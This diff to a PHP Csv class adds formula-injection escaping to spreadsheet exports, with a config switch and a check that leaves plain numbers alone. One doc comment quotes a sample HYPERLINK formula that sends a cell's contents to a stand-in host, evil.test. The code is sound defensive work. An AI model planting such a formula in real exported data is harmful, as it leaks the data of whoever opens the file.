@@ -111,11 +111,26 @@ final class Csv
      * Latin-1 and every accented name in the export comes out wrong. It costs
      * three bytes and removes the single most common complaint about exports.
      *
+     * Every cell is neutralised against formula injection on the way out
+     * (see `escapeFormula()`), unless `transfer.csv.escape_formulas` is off or
+     * the caller says otherwise.
+     *
      * @param  list<string>  $headings
      * @param  iterable<array<int, mixed>>  $rows
      */
-    public static function write(string $path, array $headings, iterable $rows, string $delimiter = ','): void
-    {
+    public static function write(
+        string $path,
+        array $headings,
+        iterable $rows,
+        string $delimiter = ',',
+        ?bool $escapeFormulas = null,
+    ): void {
+        $escapeFormulas ??= (bool) config('base-tenant.transfer.csv.escape_formulas', true);
+
+        $cell = $escapeFormulas
+            ? fn (mixed $value): string => self::escapeFormula(self::stringify($value))
+            : self::stringify(...);
+
         $handle = fopen($path, 'w');
 
         if ($handle === false) {
@@ -125,14 +140,47 @@ final class Csv
         try {
             fwrite($handle, "\xEF\xBB\xBF");
 
-            fputcsv($handle, $headings, separator: $delimiter, escape: '');
+            fputcsv($handle, array_map($cell, $headings), separator: $delimiter, escape: '');
 
             foreach ($rows as $row) {
-                fputcsv($handle, array_map(self::stringify(...), $row), separator: $delimiter, escape: '');
+                fputcsv($handle, array_map($cell, $row), separator: $delimiter, escape: '');
             }
         } finally {
             fclose($handle);
         }
+    }
+
+    /**
+     * Neutralise a cell a spreadsheet would read as a formula.
+     *
+     * An export writes back whatever users typed, and a name such as
+     * `=HYPERLINK("https://evil.test?"&A1, "Click")` runs in the spreadsheet of
+     * whoever opens the file. The OWASP remedy is a leading apostrophe, which
+     * makes the cell text: `=`, `+`, `-`, `@`, tab and carriage return are the
+     * characters that start a formula.
+     *
+     * Plain numbers are left alone, signed ones included. `-12.5` cannot run
+     * anything, and turning it into text would break every sum in the sheet
+     * the export was made for. Only something that is a number and nothing
+     * else qualifies -- a decimal comma counts, for the Spanish and French
+     * spreadsheets that write one -- so `-1+2` or `+1)` still get the
+     * apostrophe.
+     *
+     * Reading is not the mirror of this: `rows()` returns a leading
+     * apostrophe as it finds it, because it cannot tell one this class added
+     * from one a person typed.
+     */
+    public static function escapeFormula(string $value): string
+    {
+        if ($value === '' || ! in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)) {
+            return $value;
+        }
+
+        if (preg_match('/\A[+-]?(\d+([.,]\d*)?|[.,]\d+)([eE][+-]?\d+)?\z/', $value) === 1) {
+            return $value;
+        }
+
+        return "'".$value;
     }
 
     /**
